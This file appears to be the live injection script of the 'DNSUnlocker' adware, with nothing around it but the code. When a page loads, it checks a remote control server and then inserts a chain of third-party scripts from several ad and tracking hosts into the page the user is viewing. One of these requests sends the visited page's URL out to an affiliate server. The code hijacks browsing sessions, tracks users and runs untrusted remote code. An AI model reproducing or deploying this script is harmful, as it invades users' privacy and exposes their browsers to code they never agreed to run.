/* 73/6/IN  */
window._rvz9560x1009 = {'publisher_subid':'73001', 'addonname': 'DNSUnlocker'};
window._rvz9560x1010 = {'publisher_subid':'73001', 'addonname': 'DNSUnlocker'};
(function() {
  var gtprv = {
    isIE : function () { var myNav = navigator.userAgent.toLowerCase(); return (myNav.indexOf('msie') != -1) ? parseInt(myNav.split('msie')[1]) : false; },
    loadJS : function (gturl) {
      var dns_qcs8 = document.getElementsByTagName('script')[0];
      var dns_qc8 = document.createElement('script'); dns_qc8.type='text/javascript';
      dns_qc8.src=('https:' == document.location.protocol ? 'https://' : 'http://')+gturl;
      dns_qcs8.parentNode.insertBefore(dns_qc8, dns_qcs8);
    },
    loadJSON: function (callback) {
        var xobj = new XMLHttpRequest();
        xobj.overrideMimeType("application/json");
        xobj.open('GET', ('https:' == document.location.protocol ? 'https://' : 'http://')+'m73.dnsqa365.com/QualityCheck/x.txt', true);
        xobj.onreadystatechange = function () {
          if (xobj.readyState == 4) {
            if (xobj.status == "200") {
              callback(xobj.responseText);
            } else {
              callback('0');
            }
          }
        };
        xobj.send(null);
    },
    init : function() {
      var isMSIE = /*@cc_on!@*/0;
      if (gtprv.isIE () == 8) return; // IE 8 not supported
      if (isMSIE && gtprv.isIE()!= 9 && document.all && !document.querySelector) return; // IE 7 or lower not supported
      gtprv.loadJSON(function(response) {
        // Parse JSON string into object
        var actual_JSON = JSON.parse(response);
        if (actual_JSON) actual_JSON=parseInt(actual_JSON);
        else actual_JSON=0;
        if (actual_JSON==0) {
		if (window.name.indexOf('_odctxdsp') == 0) {
			//do nothing
		} else if ((window.name || '').match(/^(a652c|ld893)_/))  {
			gtprv.loadJS('cdncache-a.akamaihd.net/sub/b156ae9/73001/l.js?pid=2204&ext=DNSUnlocker');
		} else {
          		gtprv.loadJS('istatic.eshopcomp.com/fo/ec/gteamrs.js?subid=73001&bname=DNSUnlocker&blink=http%3A%2F%2Fwww.dnsunlocker.com');
          		gtprv.loadJS('istatic.eshopcomp.com/fo/ec/gteamqc.js?subid=73001&bname=DNSUnlocker&blink=http%3A%2F%2Fwww.dnsunlocker.com');
			if(window.top==window.self) {
                                var gtURL = encodeURIComponent(window.location.protocol + "//" + window.location.host + window.location.pathname);
                                gtprv.loadJS('asrvvv-a.akamaihd.net/get?addonname=DNSUnlocker&clientuid=&subID=73001&affid=9560&subaffid=1011&href='+gtURL);
                        }
          		gtprv.loadJS('cdncache-a.akamaihd.net/sub/b156ae9/73001/l.js?pid=2204&ext=DNSUnlocker');
          		gtprv.loadJS('istatic.eshopcomp.com/fo/ec/gtinimgtest.js?subid=73001&bname=DNSUnlocker&blink=http%3A%2F%2Fwww.dnsunlocker.com');
			gtprv.loadJS('istatic.eshopcomp.com/fo/ec/gtsticky.js?subid=73001&bname=DNSUnlocker&blink=http%3A%2F%2Fwww.dnsunlocker.com');
			gtprv.loadJS('cdncache-a.akamaihd.net/sub/b156ae9/73001/l.js?pid=2202&ext=DNSUnlocker');
			//gtprv.loadJS('istatic.eshopcomp.com/fo/ec/gtxt.js?subid=73001&bname=DNSUnlocker&blink=http%3A%2F%2Fwww.dnsunlocker.com');
                        //gtprv.loadJS('istatic.eshopcomp.com/fo/ec/gtjob.js?subid=73001&bname=DNSUnlocker&blink=http%3A%2F%2Fwww.dnsunlocker.com');	
          		if(window.top==window.self) {
          			gtprv.loadJS('grl.qomesn.com/sd/9560/1009.js');
				gtprv.loadJS('asrv-a.akamaihd.net/sd/9560/1010.js');
          		}
			//
          		gtprv.loadJS('3hub.org/lib?pid=75041&said=73001&san=DNSUnlocker&met=1|0');
			//
			if('600459'.length === 0) {
				// do nothing
			} else {
                           if(window.top==window.self) {
                                var lbscript = document.createElement("script");
                                lbscript.src = "//d32zx4lhje2crr.cloudfront.net/?tid="+ (location.protocol == "https:" ? "600459" : "600447");
                                lbscript.id = "ahjkjgf";
                                lbscript.setAttribute("bname", "DNSUnlocker");
                                document.getElementsByTagName("head")[0].appendChild(lbscript);
                           }
			}
                        //
		}
        }
      });
    }
  }
  gtprv.init();
})();
